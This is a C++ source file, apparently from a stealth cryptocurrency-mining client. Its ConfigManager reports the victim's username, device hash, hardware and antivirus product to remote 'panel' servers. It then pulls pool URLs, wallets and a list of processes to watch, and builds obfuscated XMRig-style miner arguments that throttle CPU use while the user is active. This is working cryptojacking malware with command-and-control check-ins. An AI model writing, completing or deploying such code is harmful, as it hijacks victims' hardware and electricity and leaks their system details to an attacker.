#include "../include/config_manager.h"
#include "../include/http_client.h"
#include "../include/util.h"
#include "../include/encryption.h"
#ifdef ENABLE_EMBEDDED_CONFIG
#include "embedded_config_generated.h"
#endif
#include <iostream>
#include <ctime>
#include <sstream>
#include <vector>
#include <thread>
#include <chrono>

bool ConfigManager::FetchConfigFromPanelWithFallback(const std::string& panelUrls,
                                                     const std::string& pcUsername,
                                                     const std::string& deviceHash,
                                                     const std::string& cpuName,
                                                     const std::string& gpuName,
                                                     const std::string& antivirusName,
                                                     const std::string& clientVersion,
                                                     double cpuHashrate,
                                                     double gpuHashrate,
                                                     int deviceUptimeMin) {
    // Split URLs by comma
    std::vector<std::string> urls;
    std::stringstream ss(panelUrls);
    std::string url;
    
    while (std::getline(ss, url, ',')) {
        // Trim whitespace
        size_t start = url.find_first_not_of(" \t\r\n");
        size_t end = url.find_last_not_of(" \t\r\n");
        if (start != std::string::npos && end != std::string::npos) {
            urls.push_back(url.substr(start, end - start + 1));
        }
    }
    
    if (urls.empty()) {
        std::cerr << "[-] No valid panel URLs provided" << std::endl;
        return false;
    }
    
#ifdef ENABLE_DEBUG_CONSOLE
    std::cout << "[*] Trying " << urls.size() << " panel URL(s) with fallback support" << std::endl;
#endif
    
    // Try each URL in sequence
    for (size_t i = 0; i < urls.size(); i++) {
        std::wstring wurl(urls[i].begin(), urls[i].end());
        
#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[*] Attempting connection to panel " << (i + 1) << "/" << urls.size() << ": " << urls[i] << std::endl;
#endif
        
        if (FetchConfigFromPanel(wurl, pcUsername, deviceHash, cpuName, gpuName, antivirusName, clientVersion, cpuHashrate, gpuHashrate, deviceUptimeMin)) {
#ifdef ENABLE_DEBUG_CONSOLE
            std::cout << "[+] Successfully connected to panel: " << urls[i] << std::endl;
#endif
            return true;
        }
        
        // If this wasn't the last URL, wait before trying next
        if (i < urls.size() - 1) {
#ifdef ENABLE_DEBUG_CONSOLE
            std::cout << "[-] Failed to connect, waiting 3 seconds before trying next URL..." << std::endl;
#endif
            std::this_thread::sleep_for(std::chrono::seconds(3));
        }
    }
    
    std::cerr << "[-] All panel URLs failed" << std::endl;
    
    // Try embedded config as fallback
    if (LoadEmbeddedConfig()) {
        return true;
    }
    
    return false;
}

bool ConfigManager::FetchConfigFromUrlWithFallback(const std::string& configUrls) {
    // Split URLs by comma
    std::vector<std::string> urls;
    std::stringstream ss(configUrls);
    std::string url;
    
    while (std::getline(ss, url, ',')) {
        // Trim whitespace
        size_t start = url.find_first_not_of(" \t\r\n");
        size_t end = url.find_last_not_of(" \t\r\n");
        if (start != std::string::npos && end != std::string::npos) {
            urls.push_back(url.substr(start, end - start + 1));
        }
    }
    
    if (urls.empty()) {
        std::cerr << "[-] No valid config URLs provided" << std::endl;
        return false;
    }
    
#ifdef ENABLE_DEBUG_CONSOLE
    std::cout << "[*] Trying " << urls.size() << " config URL(s) with fallback support" << std::endl;
#endif
    
    // Try each URL in sequence
    for (size_t i = 0; i < urls.size(); i++) {
        std::wstring wurl(urls[i].begin(), urls[i].end());
        
#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[*] Attempting GET request to config URL " << (i + 1) << "/" << urls.size() << ": " << urls[i] << std::endl;
#endif
        
        if (FetchConfigFromUrlDirect(wurl)) {
#ifdef ENABLE_DEBUG_CONSOLE
            std::cout << "[+] Successfully fetched config from: " << urls[i] << std::endl;
#endif
            return true;
        }
        
        // If this wasn't the last URL, wait before trying next
        if (i < urls.size() - 1) {
#ifdef ENABLE_DEBUG_CONSOLE
            std::cout << "[-] Failed to connect, waiting 3 seconds before trying next URL..." << std::endl;
#endif
            std::this_thread::sleep_for(std::chrono::seconds(3));
        }
    }
    
    std::cerr << "[-] All config URLs failed" << std::endl;
    
    // Try embedded config as fallback
    if (LoadEmbeddedConfig()) {
        return true;
    }
    
    return false;
}

bool ConfigManager::FetchConfigFromUrlDirect(const std::wstring& configUrl) {
    try {
#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[*] Fetching configuration directly from URL..." << std::endl;
#endif
        
        // Fetch JSON directly from URL without sending any system info
        std::string response = fetchJsonFromUrl(configUrl);
        
        if (response.empty()) {
            std::cerr << "[-] Failed to get response from config URL" << std::endl;
            return false;
        }

#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[+] Config response: " << response << std::endl;
#endif

        // Parse response
        json jsonResponse = json::parse(response);
        ParseConfigFromJson(jsonResponse);

        return true;
    }
    catch (const json::exception& e) {
        std::cerr << "[-] JSON error: " << e.what() << std::endl;
        return false;
    }
    catch (const std::exception& e) {
        std::cerr << "[-] Error: " << e.what() << std::endl;
        return false;
    }
}

bool ConfigManager::FetchConfigFromPanel(const std::wstring& panelUrl,
                                         const std::string& pcUsername,
                                         const std::string& deviceHash,
                                         const std::string& cpuName,
                                         const std::string& gpuName,
                                         const std::string& antivirusName,
                                         const std::string& clientVersion,
                                         double cpuHashrate,
                                         double gpuHashrate,
                                         int deviceUptimeMin) {
    try {
        // Build miner report JSON
        json minerReport = {
            {"pc_username", pcUsername},
            {"device_hash", deviceHash},
            {"cpu_name", cpuName},
            {"gpu_name", gpuName},
            {"cpu_hashrate", cpuHashrate},
            {"gpu_hashrate", gpuHashrate},
            {"antivirus_name", antivirusName},
            {"device_uptime_min", deviceUptimeMin},
            {"client_version", clientVersion},
            {"timestamp", std::time(nullptr)}
        };

        std::string jsonPayload = minerReport.dump();
        std::cout << "[*] Sending miner report to panel: " << jsonPayload << std::endl;

        // Post to panel
        std::string response = postJsonToUrl(panelUrl, jsonPayload);
        
        if (response.empty()) {
            std::cerr << "[-] Failed to get response from panel" << std::endl;
            return false;
        }

        std::cout << "[+] Panel response: " << response << std::endl;

        // Parse response
        json jsonResponse = json::parse(response);
        ParseConfigFromJson(jsonResponse);

        return true;
    }
    catch (const json::exception& e) {
        std::cerr << "[-] JSON error: " << e.what() << std::endl;
        return false;
    }
    catch (const std::exception& e) {
        std::cerr << "[-] Error: " << e.what() << std::endl;
        return false;
    }
}

void ConfigManager::ParseConfigFromJson(const json& jsonResponse) {
    try {
        // Parse CPU config
        if (jsonResponse.contains("cpu_config") && !jsonResponse["cpu_config"].is_null()) {
            json cpuJson = jsonResponse["cpu_config"];
            cpuConfig.mining_url = cpuJson.value("mining_url", "");
            cpuConfig.wallet = cpuJson.value("wallet", "");
            cpuConfig.password = cpuJson.value("password", "");
            cpuConfig.non_idle_usage = cpuJson.value("non_idle_usage", 50.0);
            cpuConfig.idle_usage = cpuJson.value("idle_usage", 100.0);
            cpuConfig.wait_time_idle = cpuJson.value("wait_time_idle", 300);
            cpuConfig.use_ssl = cpuJson.value("use_ssl", 0);
        }

        // Parse enable_cpu flag
        if (jsonResponse.contains("enable_cpu")) {
            cpuConfig.enabled = jsonResponse.value("enable_cpu", 1);
        } else {
            cpuConfig.enabled = 1;  // Default enabled
        }

        // Parse GPU config
        if (jsonResponse.contains("gpu_config") && !jsonResponse["gpu_config"].is_null()) {
            json gpuJson = jsonResponse["gpu_config"];
            gpuConfig.mining_url = gpuJson.value("mining_url", "");
            gpuConfig.wallet = gpuJson.value("wallet", "");
            gpuConfig.password = gpuJson.value("password", "");
            gpuConfig.algo = gpuJson.value("algo", "kawpow");
            gpuConfig.fan_speed = gpuJson.value("fan_speed", 80);
            gpuConfig.wait_time_idle = gpuJson.value("wait_time_idle", 300);
            gpuConfig.use_ssl = gpuJson.value("use_ssl", 0);
        }

        // Parse enable_gpu flag
        if (jsonResponse.contains("enable_gpu")) {
            gpuConfig.enabled = jsonResponse.value("enable_gpu", 1);
        } else {
            gpuConfig.enabled = 1;  // Default enabled
        }

        // Parse watched_processes array (empty = no process watching)
        watchedProcesses.clear();
        if (jsonResponse.contains("watched_processes") && jsonResponse["watched_processes"].is_array()) {
            for (const auto& proc : jsonResponse["watched_processes"]) {
                if (proc.is_string()) {
                    std::string name = proc.get<std::string>();
                    if (!name.empty()) watchedProcesses.push_back(name);
                }
            }
        }

        std::cout << "[+] Configuration loaded successfully" << std::endl;
        std::cout << "    CPU Mining URL: " << cpuConfig.mining_url << " (SSL: " << cpuConfig.use_ssl << ", Enabled: " << cpuConfig.enabled << ")" << std::endl;
        std::cout << "    GPU Mining URL: " << gpuConfig.mining_url << " (SSL: " << gpuConfig.use_ssl << ", Enabled: " << gpuConfig.enabled << ")" << std::endl;
    }
    catch (const std::exception& e) {
        std::cerr << "[-] Error parsing config: " << e.what() << std::endl;
    }
}

bool ConfigManager::LoadEmbeddedConfig() {
#ifdef ENABLE_EMBEDDED_CONFIG
    // Load built-in fallback configuration from embedded generated JSON string
    try {
        // Use the generated JSON string constant
        std::string configJson = EMBEDDED_CONFIG_JSON;
        
        // Parse JSON
        json embeddedConfig = json::parse(configJson);
        
        // Use the same parsing logic
        ParseConfigFromJson(embeddedConfig);
        std::cout << "[*] Using embedded fallback configuration" << std::endl;
        return true;
    }
    catch (const std::exception& e) {
        std::cerr << "[-] Error loading embedded config: " << e.what() << std::endl;
        return false;
    }
#else
    std::cerr << "[-] Embedded config not enabled at compile time" << std::endl;
    return false;
#endif
}

std::string ConfigManager::BuildCommandLineArgs(const MinerConfig& config, bool isIdle) {
    if (config.mining_url.empty() || config.wallet.empty()) {
        return "";
    }

    std::string args = OBFUSCATE_STRING("--donate-level 3 -o ");
    args += config.mining_url + " ";
    args += OBFUSCATE_STRING("-u ");
    args += config.wallet + " ";
    
    // Handle password: use Windows username if set to {USER}
    std::string password = config.password;
    if (password == "{USER}") {
        password = GetWindowsUsername();
    }
    
    if (!password.empty()) {
        args += OBFUSCATE_STRING("-p ");
        args += password + " ";
    }
    
    // Add TLS flag if use_ssl is enabled or if indicated in password field
    if (config.use_ssl == 1 || config.password.find("--tls") != std::string::npos) {
        args += OBFUSCATE_STRING("--tls ");
    }
    
    // Add performance settings based on idle state
    // --cpu-max-threads-hint accepts percentage values (0-100+)
    double usagePercent = isIdle ? config.idle_usage : config.non_idle_usage;
    if (usagePercent >= 0) {
        int hint = static_cast<int>(usagePercent);
        args += OBFUSCATE_STRING("--cpu-max-threads-hint=");
        args += std::to_string(hint) + " ";
    }
    
    args += OBFUSCATE_STRING("-a rx/0 --http-port 8888");
    
    return args;
}
